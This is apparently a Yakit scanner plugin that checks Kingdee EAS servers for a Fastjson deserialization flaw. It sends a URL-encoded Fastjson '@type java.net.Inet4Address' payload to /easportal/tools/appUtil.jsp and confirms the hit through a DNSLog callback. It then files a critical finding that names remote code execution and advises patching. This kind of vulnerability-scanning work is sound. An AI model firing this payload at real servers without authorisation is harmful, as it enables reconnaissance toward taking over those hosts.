yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    rand_Payload=str.RandStr(10)
    server,token,err = risk.NewDNSLogDomain()
    die(err)
    yakit.Info("dnslog server addr: %v ",server)
    yakit.Info("dnslog server check token: %v", token)
    reverseURL = rand_Payload+"."+server

    u= url + f`/easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22${reverseURL}%22%7D%7D`
    rsp, req = poc.Get(u, poc.replaceHeader("Content-Type", "application/x-www-form-urlencoded"))~
    header, body = poc.Split(rsp.RawPacket)
    r0_flag = false

    time.Sleep(10)
    detail, _ := risk.CheckDNSLogByToken(token)
    statuscode = rsp.GetStatusCode()
    if statuscode == 200  && len(detail) > 0 && str.Contains(detail[0].GetDomain(),rand_Payload.Lower()){
        r0_flag = true
    }
    if r0_flag {
        vulnable = true
    }

    typ="unserialize"
    if vulnable {
            yakit.Info("FOUND INFO for %v", typ)
            risk.NewRisk(
                u, 
                risk.severity("critical"),
                risk.title(sprintf("金蝶EAS Fastjson 反序列化: %s", target)),
                risk.type(typ), 
                risk.description(`金蝶EAS是一款十分出色的企业管理软件。其旧版本中使用了旧fastjson依赖，攻击者可构造恶意请求触发fastjson反序列化漏洞，造成远程代码执行，控制服务器。`),
                risk.solution(`官方已发布安全补丁，请尽快更新。`),
                risk.typeVerbose(typ),
                risk.details({
                    "request": rsp.RawRequest,
                    "response": rsp.RawPacket,
                    "url": u,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
